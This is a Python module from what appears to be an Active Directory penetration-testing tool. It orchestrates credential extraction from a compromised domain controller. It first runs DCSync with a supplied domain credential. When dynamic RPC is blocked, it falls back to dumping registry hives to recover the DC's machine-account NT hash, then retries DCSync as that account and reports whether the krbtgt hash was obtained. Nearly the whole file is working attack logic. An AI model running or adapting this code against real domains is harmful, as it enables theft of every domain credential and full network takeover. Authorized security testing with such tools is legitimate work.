"""Shared primitive: extract domain credentials from a proven SYSTEM session on a DC.

When a SYSTEM-level primitive (MSSQL SeImpersonate/TokenTheft, and future
AdminTo-on-DC / RDP / WinRM SYSTEM paths) lands on a host that IS a domain
controller of the target realm, that session already has everything a
Domain Admin has on that box — DCSync (``DS-Replication-Get-Changes*``)
included, once a domain credential with the right rights authenticates the
replication call. Two strategies, tried in order, both reusing the EXISTING
``NativeDumpService`` primitives (this module writes NO new extraction
logic):

1. **Direct DCSync** via :meth:`NativeDumpService.dcsync` — the cheap,
   complete path when the target realm's DRSUAPI (dynamic RPC 49152-65535)
   is reachable from the current vantage. Any credential with replication
   rights works (a Domain Admin, the DC's own machine account, ...).
2. **Registry-hive fallback** via :meth:`NativeDumpService.backup_operator_dump`
   when (1) fails with a DRSUAPI-unreachable signal (the classic
   dynamic-RPC-firewalled-over-a-pivot case — see CLAUDE.md "DCSync is TCP
   dynamic-RPC only"). This recovers the DC's own ``$MACHINE.ACC`` NT hash
   from ``HKLM\\SECURITY``/``HKLM\\SYSTEM`` over the SAME SMB session, then
   retries DCSync authenticated AS the DC's machine account (which always
   carries replication rights by default) instead of the credential that
   failed the first attempt.

Both strategies authenticate over aiosmb (:class:`SMBConfig`), so the caller
must already hold a DOMAIN credential with rights on the target DC's box —
this module does not mint one; the caller (the SYSTEM-escalation follow-up)
supplies whichever domain credential it already holds after proving SYSTEM
(e.g. the account it minted and added to Domain Admins).
"""

from __future__ import annotations

from dataclasses import dataclass
from typing import Any

from adscan_core.rich_output import print_exception, print_info_debug
from adscan_internal import telemetry
from adscan_internal.rich_output import mark_sensitive

_DRSUAPI_UNREACHABLE_MARKERS = (
    "timeout",
    "timed out",
    "connection refused",
    "connection reset",
    "no route to host",
    "unreachable",
)


@dataclass(frozen=True)
class SystemDcExtractionResult:
    """Outcome of a SYSTEM-on-DC credential-extraction attempt."""

    success: bool
    strategy: str = "none"  # "dcsync" | "registry_hive_fallback" | "none"
    accounts_extracted: int = 0
    krbtgt_found: bool = False
    machine_account_nt_hash: str | None = None
    machine_account_name: str | None = None
    error: str | None = None
    dcsync_direct_error: str | None = None
    """Error from the direct DCSync attempt, kept even on eventual fallback
    success — useful for diagnostics/telemetry, never client-facing."""


def _is_drsuapi_unreachable(exc: BaseException | str | None) -> bool:
    """Best-effort classification: does this error look like a blocked
    dynamic-RPC path (firewalled 49152-65535) rather than an auth/rights
    problem?

    Conservative on purpose — DCSync is TCP dynamic-RPC only (MS-DRSR), so a
    timeout/connection-refused talking to the DC's ephemeral port range is the
    expected shape of "the pivot/firewall blocks dynamic RPC", NOT "the
    credential lacks replication rights" (which surfaces as ACCESS_DENIED,
    not a transport timeout).
    """
    if exc is None:
        return False
    if isinstance(exc, (TimeoutError,)):
        return True
    text = str(exc).lower()
    return any(marker in text for marker in _DRSUAPI_UNREACHABLE_MARKERS)


async def _attempt_dcsync(
    smb_config: Any, *, target_domain: str, target_users: list[str] | None
) -> tuple[SystemDcExtractionResult, str | None]:
    """Run one DCSync attempt over ``smb_config``. Never raises.

    Returns ``(result, transport_error)`` — ``transport_error`` is the last
    seen exception's string form (for DRSUAPI-unreachable classification by
    the caller), ``None`` when nothing failed.
    """
    from adscan_internal.services.exploitation.native_dump_service import (  # noqa: PLC0415
        NativeDumpService,
    )

    svc = NativeDumpService()
    accounts = 0
    krbtgt_found = False
    last_error: BaseException | None = None
    try:
        async for secret, err in svc.dcsync(
            smb_config, target_domain=target_domain, target_users=target_users or []
        ):
            if err is not None:
                last_error = err
                telemetry.capture_exception(
                    err if isinstance(err, Exception) else RuntimeError(str(err))
                )
                continue
            if secret is None:
                continue
            accounts += 1
            username = str(getattr(secret, "username", "") or "")
            if username.lower() == "krbtgt":
                krbtgt_found = True
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_exception(exception=exc)
        last_error = exc

    if accounts == 0 and last_error is not None:
        return (
            SystemDcExtractionResult(
                success=False,
                strategy="dcsync",
                error=str(last_error),
            ),
            str(last_error),
        )
    return (
        SystemDcExtractionResult(
            success=accounts > 0,
            strategy="dcsync",
            accounts_extracted=accounts,
            krbtgt_found=krbtgt_found,
            error=None if accounts > 0 else "DCSync returned no accounts",
        ),
        str(last_error) if last_error is not None else None,
    )


async def _attempt_registry_hive_fallback(
    smb_config: Any, *, target_domain: str, target_users: list[str] | None
) -> SystemDcExtractionResult:
    """Registry-hive fallback: recover the DC's OWN machine-account NT hash via
    ``backup_operator_dump`` (reused as-is — RRP + BACKUP_RESTORE works for
    any locally-privileged/SYSTEM-derived account, not only Backup Operators),
    then retry DCSync authenticated AS that machine account.

    The DC's machine account (``DCxx$``) always carries replication rights by
    default, so it is a reliable retry principal when the originally-supplied
    credential's DCSync attempt failed for a DRSUAPI-transport reason.
    """
    import dataclasses as _dc
    import tempfile

    from adscan_internal.services.exploitation.native_dump_service import (  # noqa: PLC0415
        NativeDumpService,
    )

    with tempfile.TemporaryDirectory(prefix="adscan-sysdc-") as tmp:
        dump_result = await NativeDumpService().backup_operator_dump(
            smb_config, workspace_dir=tmp
        )

    if not dump_result.success or not dump_result.machine_account_nt_hash:
        return SystemDcExtractionResult(
            success=False,
            strategy="registry_hive_fallback",
            error=dump_result.error
            or "registry-hive dump recovered no machine account hash",
        )

    machine_hash = dump_result.machine_account_nt_hash
    machine_name = str(
        dump_result.computer_name or smb_config.target_hostname or ""
    ).split(".")[0]
    machine_account = f"{machine_name.upper()}$" if machine_name else None

    machine_smb_config = _dc.replace(
        smb_config,
        username=machine_account,
        password=None,
        nt_hash=machine_hash,
        ccache_path=None,
        use_kerberos=False,
        is_local_account=False,
    )

    retry_result, _retry_err = await _attempt_dcsync(
        machine_smb_config, target_domain=target_domain, target_users=target_users
    )
    if retry_result.success:
        return SystemDcExtractionResult(
            success=True,
            strategy="registry_hive_fallback",
            accounts_extracted=retry_result.accounts_extracted,
            krbtgt_found=retry_result.krbtgt_found,
            machine_account_nt_hash=machine_hash,
            machine_account_name=machine_account,
        )
    # DCSync-via-machine-account also failed (e.g. DRSUAPI genuinely
    # unreachable, not just the original credential's rights) — still surface
    # the recovered machine-account hash so the caller can persist it as a
    # credential even without a full DCSync walk.
    return SystemDcExtractionResult(
        success=False,
        strategy="registry_hive_fallback",
        machine_account_nt_hash=machine_hash,
        machine_account_name=machine_account,
        error=retry_result.error or "DCSync via recovered machine account also failed",
    )


def extract_dc_credentials_via_system_session(
    shell: Any,
    *,
    domain: str,
    dc_ip: str,
    dc_hostname: str | None,
    username: str,
    password: str,
    nt_hash: str | None = None,
    target_users: list[str] | None = None,
) -> SystemDcExtractionResult:
    """Extract domain credentials from a DC using an already-proven SYSTEM session.

    Sync entry point (wraps the async attempts via ``run_async_sync``) for
    callers in the CLI layer. Tries DCSync directly with the supplied
    credential first; on a DRSUAPI-transport failure (dynamic RPC blocked
    over a pivot), falls back to the registry-hive dump to recover the DC's
    own machine-account hash and retries DCSync as that principal.

    Args:
        shell: Active PentestShell (used only for network-probe context by
            the underlying transports; no ledger/credential-store writes
            happen here — persistence is the caller's job).
        domain: Target domain being replicated.
        dc_ip: Reachable IP of the target DC.
        dc_hostname: FQDN/short hostname of the target DC (Kerberos SPN).
        username: The domain credential to authenticate the FIRST DCSync
            attempt with (e.g. the account just proven Domain Admin).
        password: Password for ``username`` (mutually exclusive with
            ``nt_hash``).
        nt_hash: NT hash for ``username`` (mutually exclusive with
            ``password``).
        target_users: Specific accounts to replicate, or ``None``/empty for
            a full domain walk.

    Returns:
        :class:`SystemDcExtractionResult`. Never raises — a total failure is
        reported via ``success=False`` + ``error``.
    """
    del shell  # reserved for future posture/network-probe wiring; unused today
    from adscan_internal.services.async_bridge import run_async_sync  # noqa: PLC0415
    from adscan_internal.services.smb_transport import SMBConfig  # noqa: PLC0415

    marked_domain = mark_sensitive(domain, "domain")
    marked_user = mark_sensitive(username, "user")

    smb_config = SMBConfig(
        target_ip=dc_ip,
        target_hostname=dc_hostname,
        domain=domain,
        auth_domain=domain,
        username=username,
        password=None if nt_hash else password,
        nt_hash=nt_hash,
        kdc_ip=dc_ip,
        use_kerberos=False,
    )

    async def _run() -> SystemDcExtractionResult:
        direct, transport_error = await _attempt_dcsync(
            smb_config, target_domain=domain, target_users=target_users
        )
        if direct.success:
            print_info_debug(
                f"[mssql-sysdc] direct DCSync succeeded as {marked_user}@{marked_domain}: "
                f"{direct.accounts_extracted} accounts"
            )
            return direct

        if not _is_drsuapi_unreachable(transport_error):
            # A definitive failure (access denied, bad credential, ...) — the
            # registry-hive fallback would not fix a rights/auth problem, so
            # do not mask it with a second, unrelated attempt.
            print_info_debug(
                f"[mssql-sysdc] direct DCSync failed non-transport reason for "
                f"{marked_user}@{marked_domain}: {direct.error}"
            )
            return direct

        print_info_debug(
            "[mssql-sysdc] direct DCSync failed with a DRSUAPI-unreachable "
            f"signal ({transport_error!r}) — falling back to the registry-hive "
            "dump over the same SMB session to recover the DC's own machine "
            "account hash."
        )
        fallback = await _attempt_registry_hive_fallback(
            smb_config, target_domain=domain, target_users=target_users
        )
        # Attach the direct-DCSync error onto the fallback result — diagnostics
        # only, never client-facing.
        import dataclasses as _dc  # noqa: PLC0415

        return _dc.replace(fallback, dcsync_direct_error=direct.error)

    return run_async_sync(_run())


__all__ = [
    "SystemDcExtractionResult",
    "extract_dc_credentials_via_system_session",
]
